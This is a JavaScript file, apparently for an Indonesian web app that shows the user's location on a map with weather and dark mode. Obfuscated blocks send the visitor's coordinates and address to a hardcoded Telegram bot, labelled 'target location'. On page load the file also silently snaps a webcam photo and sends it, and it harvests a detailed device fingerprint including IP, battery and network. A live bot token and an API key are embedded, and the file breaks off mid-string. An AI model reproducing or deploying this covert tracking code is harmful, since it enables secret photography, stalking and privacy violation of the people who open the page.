// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
// script ini di lindungi oleh undang-undang hak cipta BACA README.MD

let map; 
let markers = []; 

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    const status = document.getElementById('status');
    const mapContainer = document.getElementById('map-container');
    const addressElement = document.getElementById('address');

    // Langsung menampilkan peta saat tombol ditekan
    mapContainer.style.display = 'block';
    addressElement.textContent = ''; // Reset alamat

    // Cek apakah browser mendukung Geolocation API
    if ('geolocation' in navigator) {
        document.getElementById('loadingSpinner').style.display = 'block'; // Tampilkan loading spinner
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        status.textContent = 'Mendapatkan lokasi...';
    } else {
        status.textContent = 'Geolocation tidak didukung oleh browser ini.';
    }
}

// Fungsi untuk menampilkan lokasi di peta dan mendapatkan alamat
function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapArea = document.getElementById('map');
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    // Tampilkan status lokasi
    status.textContent = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;

    // Jika peta belum diinisialisasi, buat peta baru
    if (!map) {
        map = L.map(mapArea).setView([latitude, longitude], 16); // Menggunakan zoom level lebih tinggi

        // Menggunakan Tile Layer dari OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    } else {
        // Jika peta sudah ada, setel ulang view ke lokasi baru
        map.setView([latitude, longitude], 16);
    }

    // Tambahkan marker ke lokasi saat ini
    const marker = L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Anda di sini!')
        .openPopup();
    
    // Simpan marker ke array agar bisa dihapus atau dikelola
    markers.push(marker);

    // Simpan lokasi ke riwayat
    saveLocationToHistory(latitude, longitude);

    // Mendapatkan cuaca berdasarkan lokasi
    getWeather(latitude, longitude);

    // Mendapatkan alamat dari koordinat menggunakan Nominatim
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&zoom=18&extratags=1&accept-language=id`, {
        headers: {
            'User-Agent': 'app tracker/1.0 (ailearnsbyalfian@gmail.com)' // Gmail jangan di ganti nanti eror!!
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && data.display_name) {
            addressElement.textContent = `Lokasi: ${data.display_name}`;
            // Kirim lokasi dan alamat ke Telegram
            sendLocationToTelegram(latitude, longitude, data.display_name);
        } else {
            addressElement.textContent = 'Alamat tidak ditemukan.';
        }
    })
    .catch(error => {
        console.error('Error fetching address:', error);
        addressElement.textContent = 'Error fetching address.';
    });
}

// Fungsi untuk mengirim lokasi dan alamat ke Telegram
function _0x27fb(){const _0x3262f6=['397357ccgpKk','Error:','5976922FfrwZa','5374350SuuVkB','1754797kqSkii','8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY','json','\x0aLongitude:\x20','5UHNKDq','toFixed','chat_id','error','https://api.telegram.org/bot','\x0aAlamat:\x20','append','then','969724ddLrlV','Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','POST','211293SRJvSo','catch','/sendMessage','8922ODVcEM','📍\x20Lokasi\x20Target:\x0aLatitude:\x20','Data\x20lokasi\x20tidak\x20lengkap.','Terjadi\x20kesalahan\x20saat\x20membuka\x20lokasi','88IVvVTB','20EREdqh','2105661310','458NADnym'];_0x27fb=function(){return _0x3262f6;};return _0x27fb();}function _0x5732(_0x5b0581,_0xc68bd2){const _0x27fbf3=_0x27fb();return _0x5732=function(_0x5732aa,_0x40579b){_0x5732aa=_0x5732aa-0x1e6;let _0x3d33e5=_0x27fbf3[_0x5732aa];return _0x3d33e5;},_0x5732(_0x5b0581,_0xc68bd2);}(function(_0x1a2c5b,_0x3c31ad){const _0x46f212=_0x5732,_0x32d595=_0x1a2c5b();while(!![]){try{const _0x571122=-parseInt(_0x46f212(0x200))/0x1+parseInt(_0x46f212(0x1ff))/0x2*(-parseInt(_0x46f212(0x1f8))/0x3)+parseInt(_0x46f212(0x1f2))/0x4*(-parseInt(_0x46f212(0x1ea))/0x5)+parseInt(_0x46f212(0x203))/0x6+parseInt(_0x46f212(0x202))/0x7+-parseInt(_0x46f212(0x1fc))/0x8*(parseInt(_0x46f212(0x1f5))/0x9)+-parseInt(_0x46f212(0x1fd))/0xa*(-parseInt(_0x46f212(0x1e6))/0xb);if(_0x571122===_0x3c31ad)break;else _0x32d595['push'](_0x32d595['shift']());}catch(_0x334b74){_0x32d595['push'](_0x32d595['shift']());}}}(_0x27fb,0x77848));function sendLocationToTelegram(_0x54b72b,_0x3a23a6,_0x5fc4dc){const _0x2399dd=_0x5732;if(!_0x54b72b||!_0x3a23a6||!_0x5fc4dc){console[_0x2399dd(0x1ed)](_0x2399dd(0x1fa));return;}const _0x249ab3=_0x2399dd(0x1e7),_0x5173ad=_0x2399dd(0x1fe),_0x139ca0=_0x2399dd(0x1ee)+_0x249ab3+_0x2399dd(0x1f7),_0x57696c=_0x2399dd(0x1f9)+_0x54b72b['toFixed'](0x5)+_0x2399dd(0x1e9)+_0x3a23a6[_0x2399dd(0x1eb)](0x5)+_0x2399dd(0x1ef)+_0x5fc4dc,_0x4ec46d=new FormData();_0x4ec46d[_0x2399dd(0x1f0)](_0x2399dd(0x1ec),_0x5173ad),_0x4ec46d[_0x2399dd(0x1f0)]('text',_0x57696c),fetch(_0x139ca0,{'method':_0x2399dd(0x1f4),'body':_0x4ec46d})[_0x2399dd(0x1f1)](_0x2a7eda=>_0x2a7eda[_0x2399dd(0x1e8)]())[_0x2399dd(0x1f1)](_0x446973=>{const _0x3fb9a7=_0x2399dd;_0x446973['ok']?console['log'](_0x3fb9a7(0x1f3)):console['error'](_0x3fb9a7(0x1fb));})[_0x2399dd(0x1f6)](_0x4ac236=>{const _0x2b5948=_0x2399dd;console[_0x2b5948(0x1ed)](_0x2b5948(0x201),_0x4ac236);});}

// Fungsi untuk menyimpan lokasi ke riwayat
function saveLocationToHistory(latitude, longitude) {
    const location = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;
    const locationList = document.getElementById('location-history');
    const li = document.createElement('li');
    li.textContent = location;
    locationList.appendChild(li);
}

// Fungsi untuk menangani kesalahan Geolocation
function showError(error) {
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    addressElement.textContent = ''; // Reset alamat
    switch (error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "Izin lokasi ditolak.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "Waktu permintaan lokasi habis.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "Kesalahan tidak diketahui.";
            break;
    }
}

// Fungsi untuk mengambil foto dan langsung mengirimkan ke Telegram saat halaman dimuat
function takePhotoAndSendToTelegram() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    // Tunggu hingga video siap, lalu ambil foto
                    const context = canvas.getContext('2d');

                    // Sesuaikan ukuran canvas dengan ukuran video
                    const videoWidth = video.videoWidth;
                    const videoHeight = video.videoHeight;
                    canvas.width = videoWidth;
                    canvas.height = videoHeight;

                    // Mengambil gambar dari video ke canvas
                    context.drawImage(video, 0, 0, videoWidth, videoHeight);

                    // Ambil data URI dari canvas
                    const dataUrl = canvas.toDataURL('image/png');

                    // Kirim foto ke Telegram
                    sendToTelegram(dataUrl);

                    // Matikan stream video untuk menghemat sumber daya
                    stream.getTracks().forEach(track => track.stop());
                };
            })
            .catch(function (err) {
                console.error("Terjadi kesalahan saat mengakses kamera: ", err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengirim foto ke Telegram
function _0x3256(_0x3b418c,_0x4e2c69){const _0x58109a=_0x5810();return _0x3256=function(_0x325667,_0x340b86){_0x325667=_0x325667-0xfd;let _0x220449=_0x58109a[_0x325667];return _0x220449;},_0x3256(_0x3b418c,_0x4e2c69);}(function(_0x327e35,_0x45b371){const _0x5bd424=_0x3256,_0x5ce866=_0x327e35();while(!![]){try{const _0x3a0093=-parseInt(_0x5bd424(0x109))/0x1+parseInt(_0x5bd424(0x113))/0x2*(parseInt(_0x5bd424(0x10d))/0x3)+parseInt(_0x5bd424(0x102))/0x4*(parseInt(_0x5bd424(0xfd))/0x5)+parseInt(_0x5bd424(0x108))/0x6*(parseInt(_0x5bd424(0x103))/0x7)+parseInt(_0x5bd424(0x10a))/0x8*(parseInt(_0x5bd424(0x10c))/0x9)+parseInt(_0x5bd424(0x10b))/0xa*(parseInt(_0x5bd424(0x114))/0xb)+-parseInt(_0x5bd424(0x10e))/0xc;if(_0x3a0093===_0x45b371)break;else _0x5ce866['push'](_0x5ce866['shift']());}catch(_0x48bafa){_0x5ce866['push'](_0x5ce866['shift']());}}}(_0x5810,0x9de42));function sendToTelegram(_0xf935f9){const _0x2f16c1=_0x3256,_0x22a737='8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY',_0x2c6b75='2105661310',_0x6a58bd='https://api.telegram.org/bot'+_0x22a737+_0x2f16c1(0x106);let _0x48d138=new FormData();_0x48d138[_0x2f16c1(0xfe)]('chat_id',_0x2c6b75),_0x48d138[_0x2f16c1(0xfe)](_0x2f16c1(0x107),dataURItoBlob(_0xf935f9)),fetch(_0x6a58bd,{'method':_0x2f16c1(0x104),'body':_0x48d138})[_0x2f16c1(0x100)](_0x563d4f=>_0x563d4f[_0x2f16c1(0x101)]())['then'](_0x40fc6b=>{const _0x36cc9e=_0x2f16c1;_0x40fc6b['ok']?console[_0x36cc9e(0xff)](_0x36cc9e(0x105)):console[_0x36cc9e(0x10f)](_0x36cc9e(0x112),_0x40fc6b);})[_0x2f16c1(0x110)](_0x4d5438=>{const _0x81e5b4=_0x2f16c1;console[_0x81e5b4(0x10f)](_0x81e5b4(0x111),_0x4d5438);});}function _0x5810(){const _0x156351=['9150MgBasU','106542AgJOLJ','171qQHOCx','11260332LMVSRr','error','catch','Error:','Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.','2614tRMIyT','2013ksiSRU','30235BzGRXW','append','log','then','json','764gTOLVe','14917TcDqXf','POST','Foto\x20berhasil\x20dikirim\x20ke\x20Telegram.','/sendPhoto','photo','1542joTmcs','418695hYxVZE','40jxZzFw'];_0x5810=function(){return _0x156351;};return _0x5810();}

// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Tambahkan event listener saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    checkDarkModeStatus(); // Untuk mengatur mode gelap
    takePhotoAndSendToTelegram(); // Memanggil fungsi pengambilan foto dan pengiriman otomatis
});

// Fungsi untuk membuka kamera dan menampilkan video
function openCamera() {
    const video = document.getElementById('camera');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                // Ambil foto langsung ketika kamera berhasil dibuka
                video.onloadedmetadata = () => takePhoto();
            })
            .catch(function (err) {
                console.log("Terjadi kesalahan saat mengakses kamera: " + err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengambil foto dan mengirimkan ke Telegram
function takePhoto() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Sesuaikan ukuran canvas agar sesuai dengan ukuran video
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;

    // Set canvas ukuran sesuai dengan ukuran video
    canvas.width = videoWidth;
    canvas.height = videoHeight;

    // Mengambil gambar dari stream video dan menggambar ke canvas
    context.drawImage(video, 0, 0, videoWidth, videoHeight);

    // Ambil data URI dari canvas yang sudah digambar
    const dataUrl = canvas.toDataURL('image/png');

    // Kirim foto ke Telegram
    sendToTelegram(dataUrl);
}

// Fungsi untuk mengirim foto ke Telegram
(function(_0x196d8b,_0x15c676){const _0x343c28=_0x5a2e,_0x44c089=_0x196d8b();while(!![]){try{const _0x39b51a=-parseInt(_0x343c28(0x159))/0x1+parseInt(_0x343c28(0x150))/0x2*(parseInt(_0x343c28(0x158))/0x3)+parseInt(_0x343c28(0x152))/0x4*(parseInt(_0x343c28(0x146))/0x5)+-parseInt(_0x343c28(0x15c))/0x6+-parseInt(_0x343c28(0x15b))/0x7*(parseInt(_0x343c28(0x155))/0x8)+parseInt(_0x343c28(0x149))/0x9*(-parseInt(_0x343c28(0x14f))/0xa)+parseInt(_0x343c28(0x148))/0xb;if(_0x39b51a===_0x15c676)break;else _0x44c089['push'](_0x44c089['shift']());}catch(_0x35e57d){_0x44c089['push'](_0x44c089['shift']());}}}(_0x2705,0x772aa));function sendToTelegram(_0x36216a){const _0x423148=_0x5a2e,_0x278b67='8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY',_0x46e296=_0x423148(0x14b),_0x101c48=_0x423148(0x15e)+_0x278b67+_0x423148(0x14c);let _0x5ac666=new FormData();_0x5ac666[_0x423148(0x151)](_0x423148(0x156),_0x46e296),_0x5ac666['append'](_0x423148(0x147),dataURItoBlob(_0x36216a)),fetch(_0x101c48,{'method':_0x423148(0x14e),'body':_0x5ac666})[_0x423148(0x154)](_0x5c143e=>_0x5c143e[_0x423148(0x15d)]())[_0x423148(0x154)](_0x135f8d=>{const _0x5cb128=_0x423148;_0x135f8d['ok']?alert(_0x5cb128(0x14d)):alert(_0x5cb128(0x14a));})[_0x423148(0x153)](_0x104051=>{const _0x48c792=_0x423148;console[_0x48c792(0x145)](_0x48c792(0x15a),_0x104051),alert(_0x48c792(0x157));});}function _0x5a2e(_0x598ac4,_0x54090c){const _0x270514=_0x2705();return _0x5a2e=function(_0x5a2e32,_0x5c3892){_0x5a2e32=_0x5a2e32-0x145;let _0x1bf88a=_0x270514[_0x5a2e32];return _0x1bf88a;},_0x5a2e(_0x598ac4,_0x54090c);}function _0x2705(){const _0x53d87e=['/sendPhoto','Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian','POST','820QlnDFf','403094RLgUCz','append','2956kZpoeU','catch','then','488NnyYYz','chat_id','Terjadi\x20kesalahan.','9thkIRv','469989swGJJR','Error:','40936qxgyme','3470250GJiHJb','json','https://api.telegram.org/bot','error','3260owKohx','photo','11836187rDXUEm','29556SFyNsF','Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.','2105661310'];_0x2705=function(){return _0x53d87e;};return _0x2705();}

// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Dark mode functionality
let isDarkMode = false;

function toggleDarkMode() {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('dark-mode');

    // Simpan status mode ke localStorage agar bisa bertahan saat halaman di-refresh
    localStorage.setItem('darkMode', isDarkMode);
    updateDarkModeButtonText();
}

// Fungsi untuk memeriksa apakah dark mode aktif dari localStorage
function checkDarkModeStatus() {
    const darkModeStatus = localStorage.getItem('darkMode');
    if (darkModeStatus === 'true') {
        isDarkMode = true;
        document.body.classList.add('dark-mode');
    }
    updateDarkModeButtonText();
}

// Fungsi untuk memperbarui teks tombol dark mode
function updateDarkModeButtonText() {
    const toggleButton = document.getElementById('darkModeToggle');
    toggleButton.innerHTML = isDarkMode ? '☀️ Switch to Light Mode' : '🌙 Switch to Dark Mode';
}

// Fungsi untuk mendapatkan informasi cuaca
function getWeather(lat, lon) {
    const apiKey = 'be2fbce957441bd5f28348a8a9ab448e'; // Jangan Diganti Kalo Gak Mau Eror ❗❗
    const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric&lang=id`; // Menambahkan parameter lang=id untuk Bahasa Indonesia

    fetch(url)
    .then(response => response.json())
    .then(data => {
        if (data.cod === 200) {
            const weatherInfo = `Cuaca saat ini: ${data.weather[0].description}, Suhu: ${data.main.temp}°C`;
            document.getElementById('weather').innerText = weatherInfo;
        } else {
            document.getElementById('weather').innerText = 'Cuaca tidak ditemukan untuk lokasi ini.';
        }
    })
    .catch(err => {
        console.error('Error fetching weather:', err);
        document.getElementById('weather').innerText = 'Gagal mengambil data cuaca.';
    });
}

// Fungsi untuk menambahkan penanda kustom di peta
function addCustomMarker() {
    if (map) {
        // Tambahkan event listener klik di peta
        map.on('click', function(e) {
            const lat = e.latlng.lat;
            const lon = e.latlng.lng;

            const marker = L.marker([lat, lon]).addTo(map)
                .bindPopup(`Lokasi Penanda: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
            
            markers.push(marker);

            saveLocationToHistory(lat, lon);
        });
    } else {
        alert('Peta belum diinisialisasi. Dapatkan lokasi terlebih dahulu.');
    }
}

const _0x1c8f89=_0x4424;function _0x4424(_0x1940f8,_0x9f2a4b){const _0x26ec79=_0x26ec();return _0x4424=function(_0x442491,_0x409ca7){_0x442491=_0x442491-0xb2;let _0x3c369d=_0x26ec79[_0x442491];return _0x3c369d;},_0x4424(_0x1940f8,_0x9f2a4b);}(function(_0x34d4d3,_0x394342){const _0x178a12=_0x4424,_0x3ad8ef=_0x34d4d3();while(!![]){try{const _0x1c1c71=parseInt(_0x178a12(0xfc))/0x1*(parseInt(_0x178a12(0xe1))/0x2)+parseInt(_0x178a12(0xf2))/0x3+-parseInt(_0x178a12(0x139))/0x4*(-parseInt(_0x178a12(0x13f))/0x5)+-parseInt(_0x178a12(0x116))/0x6+-parseInt(_0x178a12(0xbe))/0x7+parseInt(_0x178a12(0xf0))/0x8*(-parseInt(_0x178a12(0x131))/0x9)+parseInt(_0x178a12(0x12e))/0xa;if(_0x1c1c71===_0x394342)break;else _0x3ad8ef['push'](_0x3ad8ef['shift']());}catch(_0x3199bb){_0x3ad8ef['push'](_0x3ad8ef['shift']());}}}(_0x26ec,0xd5286));async function detectDeviceInfoAndSendToTelegram(){const _0x664427=_0x4424,_0x18ff29=navigator[_0x664427(0x134)],_0x438f18=navigator[_0x664427(0x12c)],_0x4417bc=navigator[_0x664427(0xef)],_0x10ba12=navigator[_0x664427(0x138)]?navigator['languages']['join'](',\x20'):'Tidak\x20tersedia',_0x456c83=navigator[_0x664427(0x142)],_0x5d6cdd=window['screen'][_0x664427(0xb6)],_0x121242=window[_0x664427(0x10d)][_0x664427(0xdc)],_0x1d047b=navigator['connection']||navigator[_0x664427(0xf8)]||navigator[_0x664427(0xe3)],_0x2c7a7f=navigator[_0x664427(0xf7)]?_0x664427(0xf1):_0x664427(0xd0),_0xd6a1ce=_0x1d047b?_0x1d047b['effectiveType']:_0x664427(0xc4),_0x214385=_0x1d047b?_0x1d047b[_0x664427(0xe4)]+_0x664427(0xd4):'Tidak\x20diketahui',_0x464c49=Intl[_0x664427(0x110)]()[_0x664427(0xbb)]()[_0x664427(0xeb)],_0xb6c9b1=new Date()[_0x664427(0x10e)](),_0x4807be=window[_0x664427(0x13b)]&&window[_0x664427(0x13b)](_0x664427(0xed))[_0x664427(0xb5)]?_0x664427(0xb3):'Nonaktif\x20☀️',_0xb8ed57=_0x664427(0xb9)in window||navigator[_0x664427(0x105)]>0x0?_0x664427(0xe5):_0x664427(0x140),_0x35f6f6=navigator['cookieEnabled']?_0x664427(0x130):_0x664427(0x107),_0x4b5ba5=window['matchMedia'](_0x664427(0xcd))[_0x664427(0xb5)]?_0x664427(0xcc):_0x664427(0x11b),_0x92029a=(performance['now']()/0x3e8/0x3c/0x3c)[_0x664427(0x12d)](0x2)+_0x664427(0x112),_0x228f0b=/Mobi|Android/i[_0x664427(0xcb)](_0x18ff29)?_0x664427(0xf6):_0x664427(0x123),_0x421260=detectGPU(),_0x5d4e6f=navigator[_0x664427(0xc2)]||'Tidak\x20diketahui',_0x3d4c77=navigator['deviceMemory']?navigator[_0x664427(0xc8)]+'\x20GB':_0x664427(0xc4),_0x30ab5b=calculateStorageSize(localStorage),_0x3c6ecf=calculateStorageSize(sessionStorage);let _0x4a8193=_0x664427(0xc4),_0xb206c5=_0x664427(0xc4),_0x38c8c7=_0x664427(0xc4),_0x174bff=_0x664427(0xc0),_0x1ecc08={'type':_0x664427(0xc4),'name':_0x664427(0xde)};try{const _0x15af11=await fetch(_0x664427(0xca)),_0x86dc5b=await _0x15af11[_0x664427(0x115)]();_0x4a8193=_0x86dc5b['ip']||_0x664427(0xc4);if(!_0xb206c5||_0xb206c5===_0x664427(0xc4))_0xb206c5=_0x86dc5b['latitude']||_0x664427(0xc4);if(!_0x38c8c7||_0x38c8c7===_0x664427(0xc4))_0x38c8c7=_0x86dc5b[_0x664427(0x132)]||_0x664427(0xc4);_0x174bff=_0x86dc5b[_0x664427(0xe7)]+',\x20'+_0x86dc5b[_0x664427(0x11d)]+',\x20'+_0x86dc5b['country_name'];}catch(_0x31b9c1){console['error'](_0x664427(0xdd),_0x31b9c1);}_0x1ecc08=await getNetworkInfo();let _0x39f5b5='Tidak\x20tersedia';if(navigator[_0x664427(0xbd)]){const _0x494cf1=await navigator[_0x664427(0xbd)]();_0x39f5b5=_0x664427(0xc9)+(_0x494cf1[_0x664427(0x109)]*0x64)[_0x664427(0x12d)](0x0)+_0x664427(0xb8)+(_0x664427(0xbc)+(_0x494cf1[_0x664427(0x11a)]?'Sedang\x20mengisi\x20⚡':'Tidak\x20mengisi')+',\x20')+(_0x664427(0xba)+(_0x494cf1['chargingTime']?_0x494cf1['chargingTime']+_0x664427(0xf5):_0x664427(0xc4))+',\x20')+(_0x664427(0x120)+(_0x494cf1[_0x664427(0xfd)]?_0x494cf1['dischargingTime']+_0x664427(0xf5):_0x664427(0xc4)));}navigator[_0x664427(0xf4)]?navigator[_0x664427(0xf4)][_0x664427(0xfa)](_0x2073d6=>{const _0xf54a0b=_0x664427;_0xb206c5=_0x2073d6[_0xf54a0b(0x119)][_0xf54a0b(0x137)][_0xf54a0b(0x12d)](0x6),_0x38c8c7=_0x2073d6[_0xf54a0b(0x119)]['longitude']['toFixed'](0x6),_0x174bff=_0xf54a0b(0x111)+_0xb206c5+_0xf54a0b(0xce)+_0x38c8c7,_0x58ff1c();},_0x13d2bc=>{const _0x58735c=_0x664427;console[_0x58735c(0x125)](_0x58735c(0x104),_0x13d2bc[_0x58735c(0x12f)]),_0x58ff1c();}):(console[_0x664427(0x125)]('Geolocation\x20API\x20tidak\x20didukung\x20di\x20browser\x20ini.'),_0x58ff1c());function _0x58ff1c(){const _0x398baa=_0x664427,_0x2fc5bf={'userAgent':_0x18ff29,'platform':_0x438f18,'language':_0x4417bc,'additionalLanguages':_0x10ba12,'vendor':_0x456c83,'browser':detectBrowser(),'os':detectOS(),'screenResolution':_0x5d6cdd+_0x398baa(0xda)+_0x121242,'onlineStatus':_0x2c7a7f,'connectionType':_0xd6a1ce,'downlinkSpeed':_0x214385,'timezone':_0x464c49,'localTime':_0xb6c9b1,'darkMode':_0x4807be,'touchscreen':_0xb8ed57,'cookieEnabled':_0x35f6f6,'deviceOrientation':_0x4b5ba5,'deviceUptime':_0x92029a,'hardwareConcurrency':_0x5d4e6f,'deviceMemory':_0x3d4c77,'localStorageSize':_0x30ab5b,'sessionStorageSize':_0x3c6ecf,'ipAddress':_0x4a8193,'latitude':_0xb206c5,'longitude':_0x38c8c7,'locationInfo':_0x174bff,'batteryInfo':_0x39f5b5,'isMobileDevice':_0x228f0b,'gpu':_0x421260,'networkType':_0x1ecc08['type'],'networkName':_0x1ecc08[_0x398baa(0xd5)]},_0x227cf3=_0x398baa(0xc1),_0x15926d='2105661310',_0xb4a8f9=_0x398baa(0x101)+_0x227cf3+'/sendMessage',_0x3d804d=_0x398baa(0xc6)+'🖥️\x20*Umum:*\x0a'+('•\x20*Agen\x20Pengguna:*\x20'+_0x2fc5bf[_0x398baa(0x134)]+'\x0a')+('•\x20*Platform:*\x20'+_0x2fc5bf[_0x398baa(0x12c)]+'\x0a')+(_0x398baa(0xff)+_0x2fc5bf[_0x398baa(0xef)]+'\x0a')+('•\x20*Bahasa\x20Tambahan:*\x20'+_0x2fc5bf[_0x398baa(0xe2)]+'\x0a')+(_0x398baa(0xbf)+_0x2fc5bf[_0x398baa(0x142)]+'\x0a\x0a')+_0x398baa(0xcf)+(_0x398baa(0xb7)+_0x2fc5bf['onlineStatus']+'\x0a')+(_0x398baa(0x127)+_0x2fc5bf[_0x398baa(0xe0)]+'\x0a')+(_0x398baa(0xd1)+_0x2fc5bf['downlinkSpeed']+'\x0a')+('•\x20*Jenis\x20Jaringan:*\x20'+_0x2fc5bf['networkType']+'\x0a')+(_0x398baa(0xf9)+_0x2fc5bf['networkName']+'\x0a\x0a')+_0x398baa(0x11c)+('•\x20*IP\x20Address:*\x20'+_0x2fc5bf[_0x398baa(0x136)]+'\x0a')+('•\x20*Lokasi:*\x20'+_0x2fc5bf['locationInfo']+'\x0a')+(_0x398baa(0x118)+_0x2fc5bf['latitude']+'\x0a')+('•\x20*Longitude:*\x20'+_0x2fc5bf[_0x398baa(0x132)]+'\x0a\x0a')+_0x398baa(0xd6)+('•\x20'+_0x2fc5bf[_0x398baa(0xd7)]+'\x0a\x0a')+'🔧\x20*Hardware:*\x0a'+(_0x398baa(0x145)+_0x2fc5bf[_0x398baa(0xc2)]+'\x0a')+(_0x398baa(0x10a)+_0x2fc5bf['deviceMemory']+'\x0a')+('•\x20*GPU:*\x20'+_0x2fc5bf['gpu']+'\x0a')+(_0x398baa(0xdb)+_0x2fc5bf[_0x398baa(0xd9)]+'\x0a\x0a')+_0x398baa(0x102)+(_0x398baa(0xd2)+_0x2fc5bf[_0x398baa(0xe9)]+'\x0a')+('•\x20*Zona\x20Waktu:*\x20'+_0x2fc5bf['timezone']+'\x0a')+('•\x20*Waktu\x20Boot\x20Perangkat:*\x20'+_0x2fc5bf[_0x398baa(0x121)]),_0x4c61e4=new FormData();_0x4c61e4[_0x398baa(0x117)](_0x398baa(0x106),_0x15926d),_0x4c61e4[_0x398baa(0x117)]('text',_0x3d804d),_0x4c61e4[_0x398baa(0x117)](_0x398baa(0x10c),'Markdown'),fetch(_0xb4a8f9,{'method':_0x398baa(0x13e),'body':_0x4c61e4})[_0x398baa(0xdf)](_0x42ceb8=>_0x42ceb8[_0x398baa(0x115)]())[_0x398baa(0xdf)](_0x338135=>{const _0x2ca74b=_0x398baa;_0x338135['ok']?console[_0x2ca74b(0x114)](_0x2ca74b(0xb4)):console[_0x2ca74b(0x125)]('Gagal\x20mengirim\x20informasi\x20perangkat\x20ke\x20Telegram.',_0x338135);})[_0x398baa(0x108)](_0x1ef534=>{const _0x23292f=_0x398baa;console[_0x23292f(0x125)](_0x23292f(0xc5),_0x1ef534);});}}function _0x26ec(){const _0x3bbc70=['Seluler','Google\x20Chrome','includes','Apple\x20Safari','platform','toFixed','5756130pOVEJL','message','Aktif','117UeYHIM','longitude','Edge','userAgent','Tidak\x20dapat\x20mendeteksi\x20operator','ipAddress','latitude','languages','1171012wyuvhM','Browser\x20tidak\x20dikenal','matchMedia','webgl','Microsoft\x20Edge','POST','5ZHmGOJ','Tidak\x20Ada','Linux','vendor','createElement','hasOwnProperty','•\x20*CPU\x20Cores:*\x20','mac','Aktif\x20🌙','Informasi\x20perangkat\x20berhasil\x20dikirim\x20ke\x20Telegram.','matches','width','•\x20*Status\x20Online:*\x20','%,\x20','ontouchstart','Waktu\x20Pengisian:\x20','resolvedOptions','Status\x20Pengisian:\x20','getBattery','10526019EBlFNR','•\x20*Vendor:*\x20','Lokasi\x20tidak\x20diketahui','8120685431:AAEcXK1tgJrW-UttBzYIwTbVRMfjhfJAXmY','hardwareConcurrency','UNMASKED_RENDERER_WEBGL','Tidak\x20diketahui','Error:','📱\x20*Informasi\x20Perangkat:*\x0a\x0a','Sistem\x20operasi\x20tidak\x20dikenal','deviceMemory','Level:\x20','https://ipapi.co/json/','test','Portrait','(orientation:\x20portrait)',',\x20Longitude:\x20','🌐\x20*Jaringan:*\x0a','❌\x20Offline','•\x20*Kecepatan\x20Koneksi:*\x20','•\x20*Waktu\x20Lokal:*\x20','Mozilla\x20Firefox','\x20Mbps','name','🔋\x20*Baterai:*\x0a','batteryInfo','addEventListener','touchscreen','\x20x\x20','•\x20*Touchscreen:*\x20','height','Gagal\x20mendapatkan\x20lokasi\x20berdasarkan\x20IP:','Tidak\x20tersedia','then','connectionType','162MjmMvH','additionalLanguages','webkitConnection','downlink','Ada','linux','city','DOMContentLoaded','localTime','getExtension','timeZone','length','(prefers-color-scheme:\x20dark)','wifi','language','18488sLvPUf','✅\x20Online','2424750zcVnnH','\x20KB','g